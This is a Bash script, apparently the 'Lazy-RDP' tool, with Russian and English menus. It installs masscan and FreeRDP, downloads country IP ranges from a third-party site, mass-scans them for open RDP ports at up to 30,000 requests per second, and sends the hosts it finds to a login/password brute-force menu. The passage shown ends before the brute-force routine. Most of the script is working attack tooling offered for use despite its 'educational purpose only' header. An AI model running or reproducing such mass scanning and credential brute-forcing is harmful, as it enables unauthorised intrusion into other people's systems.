#!/bin/bash
# NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
#ver=1.17
clear
##########################################COLOR######################################
colorbase="\E[0m"
black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
aquamarine="\033[1;36m"
grey="\033[1;37m"
##########################################CLEAR#######################################
CLEARALL ()
{
rm -rf Results/ paused.conf list all_results 2> /dev/null
}

######################################################################################
CHECKDISTR ()
{
distr=$(cat /etc/*-release | grep DISTRIB_CODENAME | awk -F'=' '/DISTRIB_CODENAME=/ {print $2}')
	if [ "$distr" = "sana" ]; then
	cat /etc/apt/sources.list > /etc/apt/sources.list_lazybak
		echo "deb http://old.kali.org/kali sana main non-free contrib" > /etc/apt/sources.list
	elif [ "$distr" = "kali-rolling" ]; then
	cat /etc/apt/sources.list > /etc/apt/sources.list_lazybak
		echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" > /etc/apt/sources.list
	else
		echo -e "$aquamarine[Скрипт тестировался только для $red[Kali Linux2]$aquamarine. Вы можете самостоятельно изменить код скрипта для своей ОС.]$colorbase"
		echo -e "$aquamarine[The script was tested only for $red[Kali Linux2]$aquamarine. You are free to modify the code for your operating system]$colorbase"
	exit 1
fi

}
######################################################################################
CHECKDEPEND0 ()
{
depend=$(dpkg -s masscan  | grep 'Status' | awk -F':' '/Status: / {print $2}')
	if [ "$depend" = " install ok installed" ]; then
		clear 
			
			else
			echo ""
		while true; do
		read -p "Требующийся пакет MASSCAN не установлен. Установить?/The required package MASSCAN is not installed Install?[Y][N]" yn
			case $yn in
			[Yy]* ) apt-get update -y && apt-get upgrade -y && apt-get install masscan -y; break;;
			[Nn]* ) exit;;
			* ) echo "Enter answer [Y] or [N] ";;
		esac
	done
fi

}
######################################################################################
CHECKDEPEND ()
{
depend=$(dpkg -s freerdp-x11 | grep 'Status' | awk -F':' '/Status: / {print $2}')
	if [ "$depend" = " install ok installed" ]; then
		clear 
			else
			echo ""
		while true; do
		read -p "Требующийся пакет FreeRDP не установлен. Установить?/The required package FreeRDP is not installed Install?[Y][N]" yn
			case $yn in
			[Yy]* ) apt-get update -y && apt-get upgrade -y && apt-get install freerdp-x11 libfreerdp-plugins-standard -y; break;;
			[Nn]* ) exit;;
			* ) echo "Enter answer [Y] or [N] ";;
		esac
	done
fi

}
######################################################################################

######################################################################################
CLEARALL
CHECKDISTR
CHECKDEPEND0
CHECKDEPEND
cat /etc/apt/sources.list_lazybak>/etc/apt/sources.list
rm -rf /etc/apt/sources.list_lazybak 2> /dev/null
clear

                  
echo -e       "$grey                                 +--------------------------------------+" 
echo -e       "$grey                                 |             Auto  Script             |"
echo -e "$aquamarine                                 |     by GetDrive & hackers Union      |" 
echo -e        "$red                                 |             Version 1.17             |"
echo -e        "$red                                 |$colorbase https://github.com/getdrive/Lazy-RDP$red |"
echo -e        "$red                                 +--------------------------------------+ $colorbase"
#####################################CHECKLANGUAGE####################################
CHECKLANGUAGE ()
{
lang=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1)
if [ "$lang" = "ru" ];
	then 
read -p "                                    Введите номер порта RDP {3389} : " portn
port=$(echo $portn | sed -e 's/[^0-9]//g')
if [[ -z $port ]]
	then
port=3389 
echo ""
	else
echo ""
fi
if  [[ $port -gt -1 && $port -lt 65536 ]]
	then 
echo "                                       Установлено значение порта $port"
 MENURU
        else
echo -e $red"                                     Значение порта должно быть 0-65535"$colorbase
sleep 2
./src/rdp_brute.sh


fi
		else 
read -p "                                   Enter the port number RDP {3389} : " portn
port=$(echo $portn | sed -e 's/[^0-9]//g')   #sed -e 's/[^0-9]//g'
if [[ -z $port ]]
	then port=3389 
echo ""
	else
echo ""
fi
if  [[ $port -gt -1 && $port -lt 65536 ]]
	then
echo "                                        The port value was set $port"
 MENUENG
        else
echo -e $red"                                     The port value must be 0-65535"$colorbase
sleep 2
./src/rdp_brute.sh

fi	
fi
}
######################################################################################################
#######################################COUNTRYLIST####################################
COUNTRYLIST ()
{

echo -e "$grey 1.$yellow   Afghanistan              " " $grey 2.$yellow  Albania                  " "$grey 3.$yellow  Algeria"

echo -e "$grey 4.$yellow   American_samoa           " " $grey 5.$yellow  Andorra                  " "$grey 6.$yellow  Angola"

echo -e "$grey 7.$yellow   Anguilla                 " " $grey 8.$yellow  Antigua and barbuda      " "$grey 9.$yellow  Argentina"
echo -e "$grey 10.$yellow  Armenia                  " "$grey 11.$yellow  Aruba                   " "$grey 12.$yellow  Australia"

echo -e "$grey 13 $yellow  Austria                  " "$grey 14.$yellow  Azerbaijan              " "$grey 15.$yellow  Bahamas"

echo -e "$grey 16.$yellow  Bahrain                  " "$grey 17.$yellow  Bangladesh              " "$grey 18.$yellow  Barbados"

echo -e "$grey 19.$yellow  Belarus                  " "$grey 20.$yellow  Belgium                 " "$grey 21.$yellow  Belize"

echo -e "$grey 22.$yellow  Benin                    " "$grey 23.$yellow  Bermuda                 " "$grey 24.$yellow  Bhutan"

echo -e "$grey 25.$yellow  Bolivia                  " "$grey 26.$yellow  Bosnia and herzegowina  " "$grey 27.$yellow  Botswana"

echo -e "$grey 28.$yellow  Brazil                   " "$grey 29.$yellow  British ind ocean ter.  " "$grey 30.$yellow  Brunei darussalam"

echo -e "$grey 31.$yellow  Bulgaria                 " "$grey 32.$yellow  Burkina faso            " "$grey 33.$yellow  Burundi"

echo -e "$grey 34.$yellow  Cambodia                 " "$grey 35.$yellow  Cameroon                " "$grey 36.$yellow  Canada"

echo -e "$grey 37.$yellow  Cayman islands           " "$grey 38.$yellow  Central african republic" "$grey 39.$yellow  Chile"

echo -e "$grey 40.$yellow  China                    " "$grey 41.$yellow  Colombia                " "$grey 42.$yellow  Congo democratic republic"

echo -e "$grey 43.$yellow  Cook islands             " "$grey 44.$yellow  Costa rica              " "$grey 45.$yellow  Cote d'ivoire"

echo -e "$grey 46.$yellow  Croatia                  " "$grey 47.$yellow  Cuba                    " "$grey 48.$yellow  Cyprus"

echo -e "$grey 49.$yellow  Czech republic           " "$grey 50.$yellow  Denmark                 " "$grey 51.$yellow  Djibouti" 

echo -e "$grey 52.$yellow  Dominican republic       " "$grey 53.$yellow  Ecuador                 " "$grey 54.$yellow  Egypt"

echo -e "$grey 55.$yellow  El salvador              " "$grey 56.$yellow  Eritrea                 " "$grey 57.$yellow  Estonia"

echo -e "$grey 58.$yellow  Ethiopia                 " "$grey 59.$yellow  European union          " "$grey 60.$yellow  Faroe islands"

echo -e "$grey 61.$yellow  Fiji                     " "$grey 62.$yellow  Finland                 " "$grey 63.$yellow  France"

echo -e "$grey 64.$yellow  French guiana            " "$grey 65.$yellow  French polynesia        " "$grey 66.$yellow  Gabon"

echo -e "$grey 67.$yellow  Gambia                   " "$grey 68.$yellow  Georgia                 " "$grey 69.$yellow  Germany"

echo -e "$grey 70.$yellow  Ghana                    " "$grey 71.$yellow  Gibraltar               " "$grey 72.$yellow  Greece"

echo -e "$grey 73.$yellow  Greenland                " "$grey 74.$yellow  Grenada                 " "$grey 75.$yellow  Guam"

echo -e "$grey 76.$yellow  Guatemala                " "$grey 77.$yellow  Guinea-bissau           " "$grey 78.$yellow  Haiti"

echo -e "$grey 79.$yellow  Vatican city state       " "$grey 80.$yellow  Honduras                " "$grey 81.$yellow  Hong kong"

echo -e "$grey 82.$yellow  Hungary                  " "$grey 83.$yellow  Iceland                 " "$grey 84.$yellow  India"

echo -e "$grey 85.$yellow  Indonesia                " "$grey 86.$yellow  Iran islamic republic of" "$grey 87.$yellow  Iraq"

echo -e "$grey 88.$yellow  Ireland                  " "$grey 89.$yellow  Israel                  " "$grey 90.$yellow  Italy"

echo -e "$grey 91.$yellow  Jamaica                  " "$grey 92.$yellow  Japan                   " "$grey 93.$yellow  Jordan"

echo -e "$grey 94.$yellow  Kazakhstan               " "$grey 95.$yellow  Kenya                   " "$grey 96.$yellow  Kiribati"

echo -e "$grey 97.$yellow  Korea republic of        " "$grey 98.$yellow  Kuwait                  " "$grey 99.$yellow  Kyrgyzstan"

echo -e "$grey 100.$yellow Lao people's republic    " "$grey 101.$yellow Latvia                  " "$grey 102.$yellow Lebanon"

echo -e "$grey 103.$yellow Lesotho                  " "$grey 104.$yellow Libyan arab jamahiriya  " "$grey 105.$yellow Liechtenstein"

echo -e "$grey 106.$yellow Lithuania                " "$grey 107.$yellow Luxembourg              " "$grey 108.$yellow Macau"

echo -e "$grey 109.$yellow Macedonia                " "$grey 110.$yellow Madagascar              " "$grey 111.$yellow Malawi"

echo -e "$grey 112.$yellow Malaysia                 " "$grey 113.$yellow Maldives                " "$grey 114.$yellow Mali"

echo -e "$grey 115.$yellow Malta                    " "$grey 116.$yellow Mauritania              " "$grey 117.$yellow Mauritius"

echo -e "$grey 118.$yellow Mexico                   " "$grey 119.$yellow Micronesia fed states of" "$grey 120.$yellow Moldova republic of"

echo -e "$grey 121.$yellow Monaco                   " "$grey 122.$yellow Mongolia                " "$grey 123.$yellow Morocco"

echo -e "$grey 124.$yellow Mozambique               " "$grey 125.$yellow Myanmar                 " "$grey 126.$yellow Namibia"

echo -e "$grey 127.$yellow Nauru                    " "$grey 128.$yellow Nepal                   " "$grey 129.$yellow Netherlands"

echo -e "$grey 130.$yellow Netherlands antilles     " "$grey 131.$yellow New caledonia           " "$grey 132.$yellow New zealand"

echo -e "$grey 133.$yellow Nicaragua                " "$grey 134.$yellow Niger                   " "$grey 135.$yellow Nigeria"

echo -e "$grey 136.$yellow Niue                     " "$grey 137.$yellow Non-spec asia pas loc.  " "$grey 138.$yellow Norfolk island"

echo -e "$grey 139.$yellow Northern mariana islands " "$grey 140.$yellow Norway                  " "$grey 141.$yellow Oman"

echo -e "$grey 142.$yellow Pakistan                 " "$grey 143.$yellow Palau                   " "$grey 144.$yellow Palestinian territory occupied"

echo -e "$grey 145.$yellow Panama                   " "$grey 146.$yellow Papua new guinea        " "$grey 147.$yellow Paraguay"

echo -e "$grey 148.$yellow Peru                     " "$grey 149.$yellow Philippines             " "$grey 150.$yellow Poland"

echo -e "$grey 151.$yellow Portugal                 " "$grey 152.$yellow Puerto rico             " "$grey 153.$yellow Qatar"

echo -e "$grey 154.$yellow Romania                  " "$grey 155.$yellow Russian federation      " "$grey 156.$yellow Rwanda"

echo -e "$grey 157.$yellow Saint kitts and nevis    " "$grey 158.$yellow Saint lucia             " "$grey 159.$yellow Samoa"

echo -e "$grey 160.$yellow San marino               " "$grey 161.$yellow Saudi arabia            " "$grey 162.$yellow Senegal"

echo -e "$grey 163.$yellow Serbia and montenegro    " "$grey 164.$yellow Seychelles              " "$grey 165.$yellow Sierra leone"

echo -e "$grey 166.$yellow Singapore                " "$grey 167.$yellow Slovakia                " "$grey 168.$yellow Slovenia"

echo -e "$grey 169.$yellow Solomon islands          " "$grey 170.$yellow South africa            " "$grey 171.$yellow Spain"

echo -e "$grey 172.$yellow Sri lanka                " "$grey 173.$yellow Sudan                   " "$grey 174.$yellow Suriname"

echo -e "$grey 175.$yellow Swaziland                " "$grey 176.$yellow Sweden                  " "$grey 177.$yellow Switzerland"

echo -e "$grey 178.$yellow Syrian                   " "$grey 179.$yellow Taiwan                  " "$grey 180.$yellow Tajikistan"

echo -e "$grey 181.$yellow Tanzania                 " "$grey 182.$yellow Thailand                " "$grey 183.$yellow Togo"

echo -e "$grey 184.$yellow Tonga                    " "$grey 185.$yellow Trinidad and tobago     " "$grey 186.$yellow Tunisia"

echo -e "$grey 187.$yellow Turkey                   " "$grey 188.$yellow Turkmenistan            " "$grey 189.$yellow Tuvalu"

echo -e "$grey 190.$yellow Uganda                   " "$grey 191.$yellow Ukraine                 " "$grey 192.$yellow United arab emirates"

echo -e "$grey 193.$yellow United kingdom           " "$grey 194.$yellow United states           " "$grey 195.$yellow Uruguay"

echo -e "$grey 196.$yellow Uzbekistan               " "$grey 197.$yellow Vanuatu                 " "$grey 198.$yellow Venezuela"

echo -e "$grey 199.$yellow Viet nam                 " "$grey 200.$yellow Virgin islands (british)" "$grey 201.$yellow Virgin islands (u.s.)"

echo -e "$grey 202.$yellow Yemen                    " "$grey 203.$yellow Zambia                  "  "$grey 204.$yellow Zimbabwe $colorbase"

}
######################################################################################

########################################################MENURU########################################
MENURU ()
{
echo ""
echo -e "$aquamarine            **********************************Главное меню********************************* $colorbase";
echo ""
echo -e "               +-----------------------------------------------------------------------+"
echo -e "               |$grey 1.$yellow Сканировать диапазон на наличие открытого RDP порта (ввод вручную)$colorbase | ";
echo -e "               |$grey 2.$yellow Сканировать диапазон на наличие открытого RDP порта (из файла)$colorbase     | ";
echo -e "               |$grey 3.$yellow Брутфорс Логин/Пароль (последнее сканирование)$colorbase                     | ";
echo -e "               |$grey 4.$yellow Выбор диапазона IP по стране $colorbase                                      | ";
echo -e "               |$grey 5.$yellow Выход ($red[ENTER]$yellow) $colorbase                                                   | ";
echo -e "               +-----------------------------------------------------------------------+"
echo " "
read -p "                                             Выбор из меню : " menuoption

if [ "$menuoption" = "1" ]; then
echo -e "$red---------------------------------------------------------------------------------------------------------$aquamarine"
read -p "Введите диапазон или одиночный IP {x.x.x.x/24,x.x.x.0-x.x.x.255} : " target
echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                            1.$yellow Nmap$colorbase                                 |";
echo -e "               |   $grey                            2.$yellow Masscan$colorbase                              |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                            Выберите сканер : " scan
echo -e "$red-------------------------------------------------------------------------------"
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                          Идет поиск открытых RDP.$colorbase"
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$yellow*Для выхода из режима сканирования $red'CTRL+C'$colorbase"
if [ "$scan" = "1" ]; then
nmap -Pn -sS $target -p $port --open | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILERU
	else
rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                   Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done


masscan $target -p $port --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
fi
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILERU

                         
echo ""                                  
echo -e "$aquamarine                            Адреса с открытым RDP портом:$green"    
cat open3389                         
echo ""
echo -e "$red Хосты с открытым RDP портом записаны в файл $PWD/open3389"
sleep 2
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"


MAINBRUTEMENURU
else

if [ "$menuoption" = "2" ]; then
echo -e "$aquamarine**************************************************************************************************$green"
read -p "*Введите путь к файлу с диапазонами IP {list.txt,list..& etc.} : " listname

clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                          Идет поиск открытых RDP.$colorbase"
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$yellow*Для выхода из режима сканирования $red'CTRL+C'$colorbase"

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL listname --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILERU


echo ""
echo -e "$aquamarine                            Адреса с открытым RDP портом:$green" 
cat open3389
echo ""
echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"

echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else

if [ "$menuoption" = "3" ]; then
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"


MAINBRUTEMENURU
else
if [ "$menuoption" = "4" ]; then
COUNTRYLIST
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
read -p "                          Выберите страну {1/2/3/& etc.}: " country
clear

echo -e "$aquamarine                                             Получаем список IP"
echo ""
if [ "$country"  = "1" ]; then
curl http://ipdiapazon.16mb.com/Afghanistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g" > list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2

echo ""
rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -iL list -p $port --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else

clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""
if [ "$country"  = "2" ]; then
curl http://ipdiapazon.16mb.com/Albania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""



echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "3" ]; then
curl http://ipdiapazon.16mb.com/Algeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU




echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"



echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "4" ]; then
curl http://ipdiapazon.16mb.com/American_samoa.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"


MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "5" ]; then
curl http://ipdiapazon.16mb.com/Andorra.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else

clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "6" ]; then
curl http://ipdiapazon.16mb.com/Angola.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "7" ]; then
curl http://ipdiapazon.16mb.com/Anguilla.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "8" ]; then
curl http://ipdiapazon.16mb.com/Antigua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

